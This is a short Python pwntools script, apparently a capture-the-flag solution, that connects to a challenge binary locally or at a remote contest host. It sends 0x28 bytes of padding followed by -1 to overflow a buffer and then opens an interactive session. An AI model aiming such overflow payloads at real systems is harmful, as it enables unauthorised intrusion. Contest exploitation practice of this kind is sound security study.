#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2020 wlz <wlz@kyria>
#
# Distributed under terms of the MIT license.

from pwn import * 


def exp():
    sla("message to cheer me up? :(", flat('a' *0x28, -1))


context.os='linux'
context.arch = 'amd64'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

slog = {'name' : 111}
local = int(sys.argv[1])

if local == 1:
    cn = process('./bin')
else:
    cn = remote("mc.ax", 31199)
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})

re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)
# after a, send b;

def slog_show():
    for i in slog:
        success(i + ' ==> ' + hex(slog[i]))

exp()

slog_show()

ia()
